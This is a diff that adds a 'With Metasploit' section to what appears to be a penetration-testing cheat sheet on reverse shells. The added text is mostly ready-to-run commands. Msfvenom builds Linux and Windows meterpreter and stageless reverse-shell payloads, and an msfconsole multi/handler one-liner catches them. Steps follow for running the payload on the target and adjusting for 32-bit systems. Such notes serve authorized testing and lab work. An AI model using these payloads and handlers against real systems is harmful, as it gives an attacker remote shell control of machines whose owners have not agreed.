@@ -32,6 +32,36 @@ pwncat-cs -lp 4444            # auto-stabilises the shell on connect — see pwn
 
 Full netcat reference in [netcat](netcat.md); pwncat in [pwncat](pwncat.md).
 
+### With Metasploit — generate a payload and catch it
+
+When you'd rather drop a payload file than paste a one-liner. Generate with `msfvenom`, set your `IP`/`PORT`, and get the file onto the target (transfer options in [netcat](netcat.md)).
+
+```bash
+# Linux target (x64) — standard meterpreter
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf -o shell.elf
+# Windows target (x64) — standard meterpreter
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe
+```
+
+Catch it with the **matching handler** — a meterpreter payload will **not** work over a plain `nc` listener:
+
+```bash
+# set the payload to EXACTLY what you generated, or the session dies on connect
+msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST IP; set LPORT PORT; set ExitOnSession false; run -j"
+#   Windows: same line, but  set payload windows/x64/meterpreter/reverse_tcp
+```
+
+Then run it on the target (`chmod +x shell.elf; ./shell.elf`, or execute `shell.exe`).
+
+**"Always works" fallback — stageless, caught by plain `nc`.** If staging is flaky or you just want a raw shell in the `nc -lvnp PORT` listener you already have, swap meterpreter for the self-contained `shell_reverse_tcp`:
+
+```bash
+msfvenom -p linux/x64/shell_reverse_tcp   LHOST=IP LPORT=PORT -f elf -o shell.elf    # catch: nc -lvnp PORT
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe    # catch: nc -lvnp PORT
+```
+
+Swap `x64` → `x86` for 32-bit targets; if unsure on Windows, the `x86` payload runs on both. More in [Metasploit](../Tools/Metasploit.md) (`multi/handler`).
+
 ## Reverse shell one-liners
 
 Set `IP` and `PORT` to your listener. Run **one** of these on the target.
